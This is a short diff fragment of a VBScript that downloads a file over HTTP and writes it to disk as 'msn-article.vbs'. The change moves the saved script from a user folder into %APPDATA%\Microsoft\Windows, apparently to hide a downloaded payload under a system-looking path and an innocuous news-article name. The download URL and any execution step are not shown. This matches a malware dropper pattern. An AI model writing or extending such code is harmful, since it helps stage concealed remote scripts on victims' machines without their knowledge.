@@ -6,5 +6,5 @@ xHttp.Send
 bStrm.Type = 1 '//binary
 bStrm.Open
 bStrm.write xHttp.responseBody
-bStrm.savetofile obj.ExpandEnvironmentStrings("%USERPROFILE%\folder\msn-article.vbs"), 2 '//overwrite
+bStrm.savetofile obj.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\msn-article.vbs"), 2 '//overwrite
 bStrm.Close
